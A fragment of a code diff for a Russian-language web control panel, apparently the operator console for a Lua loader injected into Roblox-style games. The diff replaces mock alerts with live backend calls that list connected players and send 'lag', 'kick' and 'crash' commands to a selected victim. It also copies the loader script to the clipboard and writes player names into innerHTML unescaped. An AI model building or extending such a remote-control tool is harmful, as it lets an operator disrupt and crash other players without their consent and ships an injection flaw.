+        navigator.clipboard.writeText(luaScript).then(() => showToast('Скрипт лоадера скопирован!'));
+    });
+
+    async function updatePlayers() {
+        try {
+            const res = await fetch(`${SERVER_URL}/api/players`, {
+                headers: { 'Authorization': authToken }
+            });
+            const players = await res.json();
+            $('#onlineCount').textContent = players.length;
+
+            const grid = $('#playerGrid');
+            grid.innerHTML = players.length === 0 ? '<div style="color:var(--text-4); padding:20px;">Нет игроков в сети</div>' : '';
+
+            players.forEach(p => {
+                const card = document.createElement('div');
+                card.className = `player-card ${currentTarget === p.username ? 'selected' : ''}`;
+                card.innerHTML = `<div class="player-avatar">${p.username[0].toUpperCase()}</div><div class="player-name">${p.username}</div>`;
+                card.addEventListener('click', () => {
+                    currentTarget = p.username;
+                    $('#targetName').textContent = p.username;
+                    document.querySelectorAll('.player-card').forEach(c => c.classList.remove('selected'));
+                    card.classList.add('selected');
+                    
+                    $('#toggleLag').classList.toggle('active', p.lagActive);
+                    $('#toggleLag').querySelector('.status-text').textContent = p.lagActive ? 'ON' : 'OFF';
+                });
+                grid.appendChild(card);
+            });
+        } catch(e) {}
+    }
+
+    async function sendCommand(command, value = null) {
+        if(!currentTarget) return showToast('Сначала выберите игрока!');
+        try {
+            await fetch(`${SERVER_URL}/api/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Authorization': authToken },
+                body: JSON.stringify({ username: currentTarget, command, value })
+            });
+            showToast(`Команда ${command} отправлена!`);
+        } catch(e) { showToast('Ошибка отправки команды'); }
+    }
+
+    $('#toggleLag').addEventListener('click', function() {
+        const isActive = !this.classList.contains('active');
+        this.classList.toggle('active', isActive);
+        this.querySelector('.status-text').textContent = isActive ? 'ON' : 'OFF';
+        sendCommand('lag', isActive);
+    });
+
+    $('#btnKick').addEventListener('click', () => sendCommand('kick'));
+    $('#btnCrash').addEventListener('click', () => sendCommand('crash'));
 
     function showToast(msg) {
         const t = $('#toast');
@@ -315,31 +269,10 @@ game:GetService("Components"):PresetLoader(WebPanel) -- Запуск фейк-к
         setTimeout(() => t.classList.remove('show'), 2500);
     }
 
-    // Логика авторизации
-    $('#loginForm').addEventListener('submit', () => {
-        const pw = $('#keyInput').value;
-        if(pw.length > 0) {
-            $('#loginScreen').classList.add('fade-out');
-            setTimeout(() => {
-                $('#loginScreen').style.display = 'none';
-                $('#mainPanel').classList.add('visible');
-            }, 500);
-        }
-    });
-
-    // Интерактивные тогглы
-    document.querySelectorAll('.toggle-wrap').forEach(t => {
-        t.addEventListener('click', function() {
-            this.classList.toggle('active');
-            const txt = this.querySelector('.status-text');
-            txt.textContent = this.classList.contains('active') ? 'ON' : 'OFF';
-            showToast(this.querySelector('.label').textContent + ' updated.');
-        });
-    });
-
-    $('#btnKick').addEventListener('click', () => { alert('Kick command sent to Jaxx25500!'); });
-    $('#btnCrash').addEventListener('click', () => { alert('Crash signal sent to Jaxx25500!'); });
-    $('#logoutBtn').addEventListener('click', () => { location.reload(); });
+    function startPolling() {
+        updatePlayers();
+        setInterval(updatePlayers, 3000);
+    }
 </script>
 </body>
 </html>
